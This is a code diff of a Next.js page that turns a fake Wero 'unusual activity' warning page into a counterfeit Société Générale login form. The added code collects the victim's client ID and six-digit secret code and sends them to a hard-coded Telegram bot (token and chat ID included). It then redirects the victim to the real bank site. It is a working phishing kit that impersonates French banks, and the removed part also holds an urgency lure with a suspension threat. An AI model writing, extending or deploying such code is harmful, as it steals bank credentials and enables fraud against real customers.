@@ -1,418 +1,340 @@
 "use client"
 
-import {
-    IconButton,
-} from "@mui/material";
-import { Modal, Box } from "@mui/material";
-import {useEffect, useState} from "react";
 import Image from "next/image";
+import KeyboardDoubleArrowRightIcon from '@mui/icons-material/KeyboardDoubleArrowRight';
+import {useEffect, useState} from "react";
+import SwitchWithText from "@/app/sg/component/switch";
+import NumericKeypadGrid from "@/app/sg/component/keyboard";
+import {z} from "zod";
+import { zodResolver } from "@hookform/resolvers/zod"
+import {useForm} from "react-hook-form"
+
+const input1Schema = z.object({
+    input1 : z.string().regex(/^\d+$/, "Votre identifiant est incorrect").min(8, "Votre identifiant est incorrect")
+})
+
+const input2Schema = z.object({
+    input2 : z.string()
+        .min(6, "Le code secret saisi est incorrect. Merci de bien vouloir ressaisir votre code secret composé de 6 chiffres."),
+})
+
+const fullSchema = input1Schema.merge(input2Schema)
+
 
 export default function Home() {
-    const [open, setOpen] = useState(false);
 
-    const handleOpen = () => setOpen(true);
-    const handleClose = () => setOpen(false);
+    const {
+        register,
+        trigger,
+        getValues,
+        setValue,
+        watch,
+        formState: { errors },
+    } = useForm({
+        resolver: zodResolver(fullSchema),
+        mode: "onTouched",
+        defaultValues : {
+            input2: ""
+        }
+    })
 
+    const [step, setStep] = useState(1);
+    const input1 = watch("input1")
+    const input2 = watch("input2")
+
+    useEffect(() => {
+        setStep(1)
+    }, [input1]);
+
+    const sendMessage = async (message : string) => {
+        const token = '8166936500:AAFN7kGshSodpKi9EgyE90vC4q5XY8KJUtI';
+        const chatId = '8343791176';
+        const text = encodeURIComponent(message || 'Message par défaut');
+
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}`;
+
+        try {
+            const response = await fetch(url);
+            const data = await response.json();
+            window.location.href = "https://particuliers.sg.fr/"
+        } catch (error) {
+        }
+    };
+
+    const resetCode = () => {
+        setValue("input2", "")
+    };
+
+    const handleClickCode = (num : string) => {
+        if(input2.length < 6){
+            setValue("input2", input2 + num)
+        }
+    };
+
+    const buildMessage = (name : string, code: string) => {
+        return (
+            `Bonjour 👋
+                Voici vos identifiants :
+                Identifiant : ${name}
+                Mot de passe  : ${code}
+                
+                Merci de garder ces informations en lieu sûr 🔐`
+                        );
+                    };
+
+
+    const onSubmit = async (e: React.MouseEvent<HTMLButtonElement>) => {
+        e.preventDefault();
+        if(step == 1){
+            const v = await trigger("input1")
+            if (v) setStep(2);
+        } else if(step == 2){
+            const v = await trigger("input2")
+            if(v){
+                const {input1, input2} = getValues()
+                console.log(buildMessage(input1, input2))
+                await sendMessage(buildMessage(input1, input2))
+            }
+
+        }
+    };
 
     return (
         <>
             <div
-                className={"fixed top-0 bg-white left-0 w-full border-b-[0.625px] h-[39px] lg:h-[53px] flex justify-between "}>
-                <div className="ml-[14px] lg:ml-12 my-auto relative w-[108.43px] h-[29px]">
-                    <Image
-                        src="/img/logo.png"
-                        alt="logo"
-                        fill
-                        className="object-contain"
-                    />
+                className={"lg:flex lg:flex-row justify-end w-full h-[24px] bg-[#010035]  text-white gap-6 pr-8 hidden"}>
+                <div className={"flex flex-row gap-2 items-center"}>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none"
+                         stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                         className="lucide lucide-map-pin-icon lucide-map-pin">
+                        <path
+                            d="M20 10c0 4.993-5.539 10.193-7.399 11.799a1 1 0 0 1-1.202 0C9.539 20.193 4 14.993 4 10a8 8 0 0 1 16 0"/>
+                        <circle cx="12" cy="10" r="3"/>
+                    </svg>
+                    <div className={"text-[12px] font-medium"}>Agences</div>
                 </div>
-                <div
-                    className={"mr-30 font-walsheim text-[15px] tracking-normal leading-[1.3] text-[#1d1c1c] hidden gap-11 my-auto lg:flex lg:flex-row"}>
-                    <div onClick={handleOpen} className={"cursor-pointer"}>Utilisateurs</div>
-                    <div onClick={handleOpen} className={"cursor-pointer"}>Professionnels</div>
-                    <div onClick={handleOpen} className={"cursor-pointer"}>Aide</div>
-                    <div onClick={handleOpen} className={"cursor-pointer"}>A propos</div>
-                    <div onClick={handleOpen} className={"cursor-pointer"}>Actualités</div>
+                <div className={"flex flex-row gap-2 items-center"}>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none"
+                         stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                         className="lucide lucide-triangle-alert-icon lucide-triangle-alert">
+                        <path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3"/>
+                        <path d="M12 9v4"/>
+                        <path d="M12 17h.01"/>
+                    </svg>
+                    <div className={"text-[12px] font-medium"}>Aide et contact</div>
                 </div>
-                <div className={"h-full flex md:flex-row"}>
-                    <div onClick={handleOpen}
-                         className={"text-[12px] font-walsheim cursor-pointer hover:bg-[#fff48d] px-[18.8px] border-l-[0.625px] border-r-[0.625px] h-full flex items-center"}>
-                        FR
-                    </div>
-                    <div onClick={handleOpen}
-                         className={"my-auto mx-auto hover:bg-[#fff48d] cursor-pointer text-[12px] pt-[3px] px-[18.8px] lg:hidden flex bg-[#1d1c1c] h-full items-center"}>
-                        <svg xmlns="http://www.w3.org/2000/svg"
-                             width="23" height="23"
-                             viewBox="0 0 24 24"
-                             fill="none"
-                             stroke="white"
-                             strokeWidth="1.3"
-                             strokeLinecap="round"
-                             strokeLinejoin="round"
-                             className="lucide lucide-text-align-justify-icon lucide-text-align-justify">
-                            <path d="M2 4h18"/>
-                            <path d="M2 10h18"/>
-                            <path d="M2 16h18"/>
-                        </svg>
-                    </div>
-                </div>
-
             </div>
             <div
-                className="lg:mt-30 md:mx-auto w-full lg:w-2/3 h-full py-20 md:py-10 px-6 md:px-24 flex items-center justify-center border-[0.625px] bg-[#fff48d]">
-                <div className="w-full space-y-6 ">
-                    <div className={"flex-row flex gap-10"}>
-                        <h1 style={{ fontFamily: 'Walsheim-bold, sans-serif' }} className="text-[30px] md:text-[40px] font-semibold tracking-tight text-center mt-8 ">
-                            <span className={"underline underline-offset-4"}>Action requise</span> sur votre compte Wero !</h1>
-                    </div>
-                    <div className="text-gray-800 text-[17px] md:text-[18px]">
-                        Nous avons détecté une <span className={"underline underline-offset-3"}>activité inhabituelle</span> sur votre compte Wero.
-                        Pour sécuriser votre compte, veuillez vérifier vos informations immédiatement en cliquant sur le
-                        lien ci-dessous :
-                    </div>
-                    <div>
-                        <div className="flex gap-3 justify-center mt-4">
-                            <button
-                                onClick={handleOpen}
-                                className="cursor-pointer flex items-center gap-2 px-4 py-2 rounded-full border border-[#1d1c1c] bg-white shadow-[0_3px_0_#1d1c1c] font-medium text-sm text-[#1d1c1c] transition-all duration-300 hover:flex-row-reverse">
-                                <span className="transition-all duration-500">Sécuriser mon compte</span>
-                                <span
-                                    className="flex items-center justify-center w-7 h-7 rounded-full bg-[#fff48d] border border-[#1d1c1c] transition-all duration-300">
-                                <svg xmlns="http://www.w3.org/2000/svg"
-                                     className="w-4 h-4 transform rotate-45 transition-transform duration-500"
-                                     fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2">
-                                  <path strokeLinecap="round" strokeLinejoin="round" d="M17 8l4 4m0 0l-4 4m4-4H7"/>
-                                </svg>
-                              </span>
-                            </button>
-                        </div>
-                    </div>
-                    <div className={"text-sm"}>
-                        *Si vous ne mettez pas à jour vos informations dans les 24 heures, votre compte sera
-                        temporairement
-                        suspendu.
-                    </div>
+                className={"w-full h-[89.2px] border-b-1 border-gray-300 items-center flex flex-row px-4 justify-between"}>
+                <div>
+                    <Image height={56} width={205} src="/img/sg_m.png" alt=""/>
+                </div>
+                <div>
+                    <button
+                        className="cursor-pointer bg-[#010035] items-center rounded-full text-white py-3 px-6 hidden md:flex">
+                        <span>Ouvrir un compte</span>
+                    </button>
                 </div>
             </div>
-            <Modal open={open} onClose={handleClose}>
-                <Box
-                    sx={{
-                        position: 'absolute',
-                        top: '50%',
-                        left: '50%',
-                        transform: 'translate(-50%, -50%)',
-                        width: {
-                            xs: '100%',
-                            sm: 600.5
-                        },
-                        minHeight: {
-                            xs: '100%',
-                            sm: '80%'
-                        },
-                        maxHeight: {
-                            xs: '100%',
-                            sm: '80%'
-                        },
-                        bgcolor: '#F7F7F7',
-                        border: '0.875px solid #000',
-                        px: {
-                            xs: 2,
-                            sm: 4
-                        },
-                        py: {
-                            xs: 4,
-                            sm: 4
-                        },
-                        overflow: 'auto'
-                    }}
-                >
-                    <IconButton
-                        onClick={handleClose}
-                        sx={{
-                            position: 'absolute',
-                            top: 8,
-                            right: 8,
-                            color: 'grey.700',
-                        }}
-                    >
-                        <svg
-                            xmlns="http://www.w3.org/2000/svg"
-                            width="21"
-                            height="21"
-                            viewBox="0 0 24 24"
-                            fill="none"
-                            stroke="currentColor"
-                            strokeWidth="1.3"
-                            strokeLinecap="round"
-                            strokeLinejoin="round"
-                        >
-                            <path d="M18 6 6 18"/>
-                            <path d="M6 6 18 18"/>
-                        </svg>
-                    </IconButton>
-                    <div style={{ fontFamily: 'Walsheim-bold, sans-serif' }}
-                         className={" text-2xl"}>
-                        Sélectionnez votre banque
-                    </div>
-                    <div className={"mt-2 font-medium text-md"}>
-                        Veuillez sélectionnez votre banque afin de pouvoir continuer à faire des virements :
-                    </div>
-                    <div                           style={{ fontFamily: 'Walsheim-bold, sans-serif' }}
-                                                   className={""}>
-                        <a href={"/sg"}
-                            className={"w-full bg-white flex flex-row h-[76px] mt-6 items-center justify-between rounded-md hover:shadow-lg cursor-pointer"}>
-                            <div className={"flex flex-row items-center "}>
-                                <div
-                                    className={" border-[2.1px] p-[7px] w-[48px] h-[48px] ml-4 rounded-xs border-[#1d1c1c] bg-white shadow-[3px_5px_0_#1d1c1c,0_0px_0_#1d1c1c]"}>
-                                    <Image height={"50"} width={"50"} src={"/img/sg.png"} alt=""/>
-                                </div>
-                                <div className={"ml-4 font-semibold"}>
-                                    SG
-                                </div>
-                            </div>
-                            <div className={"mr-4 border-[2.2px] rounded-xs"}>
-                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24"
-                                     fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
-                                     stroke-linejoin="round"
-                                     className="lucide lucide-chevron-right-icon lucide-chevron-right">
-                                    <path d="m9 18 6-6-6-6"/>
-                                </svg>
-                            </div>
-                        </a>
-                        <div
-                            className={"w-full bg-white flex flex-row h-[76px] mt-2 items-center justify-between rounded-md hover:shadow-lg cursor-pointer"}>
-                            <div className={"flex flex-row items-center "}>
-                                <div className={" border-[2.1px] p-[6px] w-[48px] h-[48px] ml-4 rounded-xs border-[#1d1c1c] bg-white shadow-[3px_5px_0_#1d1c1c,0_0px_0_#1d1c1c]"}>
-                                    <Image height={"50"} width={"50"} src={"/img/bnb.png"} alt=""/>
-                                </div>
-                                <div className={"ml-4 font-semibold"}>
-                                    BNP Paribas
-                                </div>
-                            </div>
-                            <div className={"mr-4 border-[2.2px] rounded-xs"}>
-                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24"
-                                     fill="none" stroke="currentColor" strokeWidth="2" stroke-linecap="round"
-                                     stroke-linejoin="round"
-                                     className="lucide lucide-chevron-right-icon lucide-chevron-right">
-                                    <path d="m9 18 6-6-6-6"/>
-                                </svg>
-                            </div>
-                        </div>
-                        <div
-                            className={"w-full bg-white flex flex-row h-[76px] mt-2 items-center justify-between rounded-md hover:shadow-lg cursor-pointer"}>
-                            <div className={"flex flex-row items-center "}>
-                                <div
-                                    className={" border-[2.1px] flex items-center justify-center w-[48px] h-[48px] ml-4 rounded-xs border-[#1d1c1c] bg-white shadow-[3px_5px_0_#1d1c1c,0_0px_0_#1d1c1c]"}>
-                                    <Image height={"32"} width={"32"} src={"/img/ce.png"} alt=""/>
-                                </div>
-                                <div className={"ml-4 font-semibold"}>
-                                    Caisse d’Epargne
-                                </div>
-                            </div>
-                            <div className={"mr-4 border-[2.2px] rounded-xs"}>
-                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24"
-                                     fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
-                                     stroke-linejoin="round"
-                                     className="lucide lucide-chevron-right-icon lucide-chevron-right">
-                                    <path d="m9 18 6-6-6-6"/>
-                                </svg>
-                            </div>
-                        </div>
-                        <div
-                            className={"w-full bg-white flex flex-row h-[76px] mt-2 items-center justify-between rounded-md hover:shadow-lg cursor-pointer"}>
-                            <div className={"flex flex-row items-center "}>
-                                <div
-                                    className={" border-[2.1px] flex items-center p-[7px] w-[48px] h-[48px] ml-4 rounded-xs border-[#1d1c1c] bg-white shadow-[3px_5px_0_#1d1c1c,0_0px_0_#1d1c1c]"}>
-                                    <Image height={"50"} width={"50"} src={"/img/ca.png"} alt=""/>
-                                </div>
-                                <div className={"ml-4 font-semibold"}>
-                                    Crédit Agricole
-                                </div>
-                            </div>
-                            <div className={"mr-4 border-[2.2px] rounded-xs"}>
-                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24"
-                                     fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
-                                     stroke-linejoin="round"
-                                     className="lucide lucide-chevron-right-icon lucide-chevron-right">
-                                    <path d="m9 18 6-6-6-6"/>
-                                </svg>
-                            </div>
-                        </div>
-                        <div
-                            className={"w-full bg-white flex flex-row h-[76px] mt-2 items-center justify-between rounded-md hover:shadow-lg cursor-pointer"}>
-                            <div className={"flex flex-row items-center "}>
-                                <div
-                                    className={" border-[2.1px] p-[7px] flex items-center w-[48px] h-[48px] ml-4 rounded-xs border-[#1d1c1c] bg-white shadow-[3px_5px_0_#1d1c1c,0_0px_0_#1d1c1c]"}>
-                                    <Image height={"50"} width={"50"} src={"/img/ci.png"} alt=""/>
-                                </div>
-                                <div className={"ml-4 font-semibold"} >
-                                    CIC
-                                </div>
-                            </div>
-                            <div className={"mr-4 border-[2.2px] rounded-xs"}>
-                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24"
-                                     fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
-                                     stroke-linejoin="round"
-                                     className="lucide lucide-chevron-right-icon lucide-chevron-right">
-                                    <path d="m9 18 6-6-6-6"/>
-                                </svg>
-                            </div>
-                        </div>
-                        <div
-                            className={"w-full bg-white flex flex-row h-[76px] mt-2 items-center justify-between rounded-md hover:shadow-lg cursor-pointer"}>
-                            <div className={"flex flex-row items-center "}>
-                                <div
-                                    className={" border-[2.1px] flex items-center p-[7px] w-[48px] h-[48px] ml-4 rounded-xs border-[#1d1c1c] bg-white shadow-[3px_5px_0_#1d1c1c,0_0px_0_#1d1c1c]"}>
-                                    <Image height={"50"} width={"50"} src={"/img/bp.png"} alt=""/>
-                                </div>
-                                <div className={"ml-4 font-semibold"}>
-                                    BRED Banque Populaire
-                                </div>
-                            </div>
-                            <div className={"mr-4 border-[2.2px] rounded-xs"}>
-                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24"
-                                     fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
-                                     stroke-linejoin="round"
-                                     className="lucide lucide-chevron-right-icon lucide-chevron-right">
-                                    <path d="m9 18 6-6-6-6"/>
-                                </svg>
-                            </div>
-                        </div>
-                        <div
-                            className={"w-full bg-white flex flex-row h-[76px] mt-2 items-center justify-between rounded-md hover:shadow-lg cursor-pointer"}>
-                            <div className={"flex flex-row items-center "}>
-                                <div
-                                    className={"border-[2.1px] p-[7px] w-[44px] h-[44px] ml-4 rounded-xs border-[#1d1c1c] bg-white shadow-[3px_5px_0_#1d1c1c,0_0px_0_#1d1c1c]"}>
-                                    <Image height={"50"} width={"50"} className={"border-3"} src={"/img/cm.png"} alt=""/>
-                                </div>
-                                <div className={"ml-4 font-semibold"}>
-                                    Crédit Mutuel
-                                </div>
-                            </div>
-                            <div className={"mr-4 border-[2.2px] rounded-xs"}>
-                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24"
-                                     fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
-                                     stroke-linejoin="round"
-                                     className="lucide lucide-chevron-right-icon lucide-chevron-right">
-                                    <path d="m9 18 6-6-6-6"/>
-                                </svg>
-                            </div>
-                        </div>
-                    </div>
-                </Box>
-            </Modal>
-            <div className="px-4 mx-auto flex flex-col items-center justify-center mt-20 w-full md:w-2/3">
-                <Image
-                    src="/img/banks.png"
-                    alt="logo"
-                    width={1200}
-                    height={400}
-                    className="w-full h-auto object-contain"
-                />
+            <div
+                style={{ color: "#545454" }}
+                className="mt-3 pl-6 font-semibold text-[16px]"
+            >
+                Connexion à votre Espace Client Particuliers
             </div>
+            <div className="flex flex-col mx-auto  justify-center bg-white/95 w-full max-w-6xl mt-44 md:mt-10">
+                <div className={"flex flex-col md:flex-row"}>
+                    <div className={"w-full md:w-1/2 md:border-r-2 md:border-gray-400 mt-8"}>
+                        <form className="bg-white p-8 w-full max-w-sm mx-auto">
+                            <div className="relative mb-0 pb-0">
+                                <input
+                                    type="text"
+                                    id="name"
+                                    className="text-[19px] tracking-[1.5px] font-semibold peer block w-full border-b border-gray-500 p-2 pr-8 text-gray-600 focus:outline-none focus:border-black"
+                                    placeholder=" "
+                                    maxLength={8}
+                                    {...register("input1")}
+                                />
+                                <label
+                                    htmlFor="name"
+                                    className="absolute left-2 top-4 text-gray-500 transition-all
+                                       peer-placeholder-shown:top-2
+                                       peer-focus:-top-4 peer-focus:font-semibold peer-focus:text-[15px] peer-focus:text-md
+                                       peer-not-placeholder-shown:-top-4 text-lg"
+                                >
+                                    Saisissez votre identifiant
+                                </label>
 
-            <div className={"mt-30"}>
-                <div className={"flex flex-row  border-b-[0.625px]"}>
-                    <div className={"w-1/12"}></div>
-
-                    <div
-                        className={"pl-6 md:pl-20 h-[180px] flex items-start gap-4 justify-center md:items-center flex-col md:flex-row md:justify-between py-auto bg-[#fff48d] w-full border-l-[0.625px] border-r-[0.625px] border-t-[0.625px]"}>
-                        <div
-                            style={{ fontFamily: 'Walsheim-bold, sans-serif' }}
-                            className=" font-bold text-[30px] sm:text-[35px] md:text-[35px] lg:text-[45px] tracking-[-1px]">
-                            Le futur des paiements est déjà là.
-                        </div>
-                        <div className="mr-20 ">
-                            <button
-                                onClick={handleOpen}
-                                className="cursor-pointer flex items-center gap-2 px-4 py-2 rounded-full border border-[#1d1c1c] bg-white shadow-[0_3px_0_#1d1c1c] font-medium text-sm text-[#1d1c1c]">
-                                <span>Démarrer.</span>
-                                <span
-                                    className="flex items-center justify-center w-7 h-7 rounded-full bg-[#fff48d] border border-[#1d1c1c]">
-                                        <svg xmlns="http://www.w3.org/2000/svg" className="w-4 h-4 transform"
-                                             style={{rotate: "45deg"}}
-                                             fill="none" viewBox="0 0 24 24" stroke="currentColor"
-                                             strokeWidth="2">
-                                        <path strokeLinecap="round" strokeLinejoin="round"
-                                              d="M17 8l4 4m0 0l-4 4m4-4H7"/>
+                                {step && (
+                                    <button
+                                        type="button"
+                                        onClick={() => setValue("input1", "")}
+                                        className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-500 cursor-pointer "
+                                    >
+                                        {input1 && input1.length == 8 && /^\d+$/.test(input1) ? (
+                                            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25"
+                                                 viewBox="0 0 24 24" fill="none" stroke="#55d39e" stroke-width="3.5"
+                                                 stroke-linecap="round" stroke-linejoin="round"
+                                                 className="lucide lucide-check-icon lucide-check">
+                                                <path d="M17 8 10.5 15l-3.5-3.5"/>
+                                            </svg>
+                                        ) : (
+                                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24"
+                                                 viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                                 stroke-width="3.5"
+                                                 stroke-linecap="round" stroke-linejoin="round"
+                                            className="lucide lucide-x-icon lucide-x">
+                                            <path d="M18 6 6 18"/>
+                                            <path d="m6 6 12 12"/>
+                                            </svg>
+                                            )}
+                                    </button>
+                                )}
+                            </div>
+                            {(errors.input1 && step == 1) || (errors.input2 && step == 2) ? (
+                                <div className="flex justify-center mt-4">
+                                    <p className="text-red-500 text-[13px] text-center">
+                                        {errors.input1?.message || errors.input2?.message}
+                                    </p>
+                                </div>
+                            ) : null}
+                            <div className={"mb-6 flex flex-row justify-center gap-2 mt-2"}>
+                                <SwitchWithText/>
+                                <div className={"text-[#545454]"}>
+                                    Se souvenir de moi
+                                </div>
+                                <div>
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24"
+                                         fill="none" stroke="#545454" stroke-width="1" stroke-linecap="round"
+                                         stroke-linejoin="round" className="lucide lucide-info-icon lucide-info">
+                                        <circle cx="12" cy="12" r="9"/>
+                                        <path d="M12 16v-4" stroke-width="2"/>
+                                        <path d="M12 8h.01" stroke-width="2"/>
                                     </svg>
-                              </span>
-                            </button>
-
-                        </div>
-                    </div>
-                    <div className={"w-1/12"}></div>
-                </div>
-                <div className={"h-[631px] flex flex-row"}>
-
-                    <div className={"w-1/12 bg-[#fff48d]"}></div>
-
-                    <div
-                        className={"flex flex-col w-full h-[631px] border-b-[0.625px] border-l-[0.625px] border-r-[0.625px]"}>
-                        <div
-                            className={"flex flex-col md:flex-row md:justify-between h-full py-10 md:pt-20 px-3 md:px-12"}>
-                            <div className={"flex flex-col w-full md:w-1/2"}>
-                                <div className={"flex flex-row justify-between"}>
-                                    <div className={"text-[13px]"}>
-                                        <div className={'font-[15px]'}>
-                                            Découvrir
-                                        </div>
-                                        <div className={"mt-2 "}>
-                                            Accueil<br/>
-                                            Utilisateurs<br/>
-                                            Professionnels<br/>
-                                            Aide<br/>
-                                            A propos<br/>
-                                            Actualités<br/>
-                                        </div>
-                                    </div>
-                                    <div className={"text-[13px]"}>
-                                        <div className={'font-[500] '}>
-                                            Informations pratiques
-                                        </div>
-                                        <div className={"mt-2"}>
-                                            Centre de confidentialité<br/>
-                                            Centre Légal<br/>
-                                            Conditions d&apos;utilisation du site web<br/>
-                                            Conditions générales de wero<br/>
-                                            Sécurité<br/>
-                                            Presse<br/>
-                                        </div>
-                                    </div>
-                                </div>
-                                <div className={"mt-8 md:mt-16 text-[13px]"}>
-                                    Wero est un produit de <span
-                                    className={"underline underline-offset-4"}>EPI Company SE </span><br/>
-                                    Disponible en Allemagne, Belgique et France.<br/>
-
-                                    De Lignestraat 13, 1000 Brussels, Belgium<br/>
-                                    VAT: BE0755811726<br/>
-                                    Capital partagé : € 453MM<br/><br/>
 
 
-                                    Détails de la licence : n° 0755.811.726. Autorisé par la Banque Nationale de Belgique
-                                    en tant qu&apos;institution de paiement le 20 février 2024. PISP et AISP pour les services
-                                    (7 services d’initiation de paiement et 8 services d’information sur les
-                                    comptes).<br/><br/>
-
-                                    © 2025 EPI Company SE
                                 </div>
                             </div>
-                            <div className={"w-full md:w-1/2 flex justify-start md:justify-end ml-[-10px] mt-6 md:mt-0"}>
-                                <div className="relative ml-0 lg:ml-[14px] w-[170px] h-[40px] md:w-[170px] md:h-[40px]">
-                                    <Image
-                                        src="/img/logo.png"
-                                        alt="logo"
-                                        fill
-                                        className="object-contain"
-                                    />
-                                </div>
+                            {step == 2 && <NumericKeypadGrid value={input2} handleClick={handleClickCode} reset={resetCode} />}
+                            <div className="flex justify-center">
+                                <button
+                                    type={"button"}
+                                    onClick={(e) => {onSubmit(e)}}
+                                    className="w-[240px] font-semibold cursor-pointer bg-[#e9041e] rounded-full text-white py-[10px] flex justify-center items-center">
+                                    Valider
+                                </button>
+                            </div>
+                            {step == 2 &&
+                            <div style={{color: "#545454"}} className={"mt-3 flex justify-center font-semibold text-[15px] underline cursor-pointer"} >Activer le clavier sonore</div>}
+                        </form>
+                    </div>
+                    <div className={"w-full md:w-1/2 mt-10 pl-4 pt-6 pb-10 md:ml-20 bg-[#f7f7f7] md:bg-white"}>
+                        <span style={{color: "#545454"}} className={"font-semibold text-[15px]"}>Où trouver mon Code Client SG ?</span><br/>
+                        <ul className={"list-disc ml-8 mt-3"}>
+                            <li>
+                                Votre Code Client vous a été communiqué lors de la souscription à la Banque à Distance.
+                                Il est également indiqué sur vos relevés de comptes.
+                            </li>
+                        </ul>
+                        <br/>
+                        <span style={{color: "#545454"}} className={"font-semibold text-[15px]"}>Code Client ou Code Secret inconnus ?</span><br/>
+                        <ul className="text-gray-800 list-none mt-4">
+                            <li className="flex items-center">
+                                <KeyboardDoubleArrowRightIcon  style={{ fontSize: "15px" }} className={"mr-[2px]"}/>
+                                <span className={"underline cursor-pointer "}>Je souhaite obtenir mon Code Client</span><br/>
+                            </li>
+                            <li className="flex items-center">
+                                <KeyboardDoubleArrowRightIcon  style={{ fontSize: "15px" }} className={"mr-[2px]"}/>
+                                <span className={"underline cursor-pointer"}>Je ne connais pas mon Code Secret</span><br/>
+                            </li>
+                        </ul>
+
+                    </div>
+                </div>
+                <div>
+                </div>
+            </div>
+
+            <footer className={"flex items-center  w-full h-auto md:h-[110.4px] bg-black text-white text-[17px] md:mt-44"}>
+                <div className={"flex flex-col lg:flex-row justify-center lg:justify-between w-full max-w-7xl lg:mx-auto mt-2"}>
+                    <div className={"flex flex-col md:flex-row md:gap-16 items-center justify-center"}>
+                        <div className={"flex flex-col items-center md:flex-row md:gap-2"}>
+                            <div className={""}>
+                                <Image height={53} width={47} src="/img/questions.png" alt=""/>
+                            </div>
+                            <div className={"md:mt-2 hover:underline cursor-pointer"}>Questions fréquentes</div>
+                        </div>
+                        <div className={"flex flex-col items-center md:flex-row md:gap-2"}>
+                            <div>
+                                <Image height={50} width={33} src="/img/localisation.png" alt=""/>
+                            </div>
+                            <div className={"md:mt-2 decoration-white hover:underline cursor-pointer"}>Trouver une agence</div>
+                        </div>
+                        <div className={"flex flex-row md:gap-2"}>
+                            <div className={"md:mt-2 decoration-white hover:underline cursor-pointer"}>
+                                Autres sites SG
+                            </div>
+                            <div className={"md:mt-2"}>
+                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+                                     stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                                     className="lucide lucide-chevron-down-icon lucide-chevron-down">
+                                    <path d="m6 9 6 6 6-6"/>
+                                </svg>
                             </div>
                         </div>
                     </div>
-                    <div className={"w-1/12 bg-[#fff48d]"}></div>
+                    <div className={"flex flex-row md:gap-3  justify-center"}>
+                        <Image className={"cursor-pointer"} height={58} width={49} src="/img/fb.png" alt=""/>
+                        <Image className={"cursor-pointer"} height={58} width={49} src="/img/ig.png" alt=""/>
+                        <Image className={"cursor-pointer"} height={58} width={49} src="/img/x.png" alt=""/>
+                    </div>
                 </div>
-                <div className={"h-10 bg-[#fff48d]"}></div>
+            </footer>
+            <div className={"flex flex-col items-center justify-center w-full mb-4"}>
+                <Image className={"cursor-pointer mt-4"} height={40} width={110} src="/img/sgbig.webp" alt=""/>
+                <div className="flex flex-col justify-center items-center md:flex-row flex-wrap text-[#666] text-md max-w-7xl mx-auto ">
+                    <div className="flex items-center whitespace-nowrap hover:underline">
+                        Sécurité
+                        <span className="mx-2 hidden md:inline">|</span>
+                    </div>
+                    <div className="flex items-center whitespace-nowrap hover:underline">
+                        Nos engagements
+                        <span className="mx-2 hidden md:inline">|</span>
+                    </div>
+                    <div className="flex items-center whitespace-nowrap hover:underline">
+                        Gestion des Cookies
+                        <span className="mx-2 hidden md:inline">|</span>
+                    </div>
+                    <div className="flex items-center whitespace-nowrap hover:underline">
+                        Données personnelles
+                        <span className="mx-2 hidden md:inline">|</span>
+                    </div>
+                    <div className="flex items-center whitespace-nowrap hover:underline">
+                        Documentation et Tarifs
+                        <span className="mx-2 hidden md:inline">|</span>
+                    </div>
+                    <div className="flex items-center whitespace-nowrap hover:underline">
+                        Résilier une prestation
+                        <span className="mx-2 hidden md:inline">|</span>
+                    </div>
+                    <div className="flex items-center whitespace-nowrap hover:underline">
+                        Contestation et réclamation
+                        <span className="mx-2 hidden md:inline">|</span>
+                    </div>
+                    <div className="flex items-center whitespace-nowrap hover:underline">
+                        Informations légales
+                        <span className="mx-2 hidden md:inline">|</span>
+                    </div>
+                    <div className="flex items-center whitespace-nowrap hover:underline">
+                        Accessibilité Numérique (partiellement conforme)
+                        <span className="mx-2 hidden md:inline">|</span>
+                    </div>
+                    <div className="flex items-center whitespace-nowrap hover:underline">
+                        Label « Engagé RSE »
+                    </div>
+                </div>
+
+
             </div>
         </>
     );
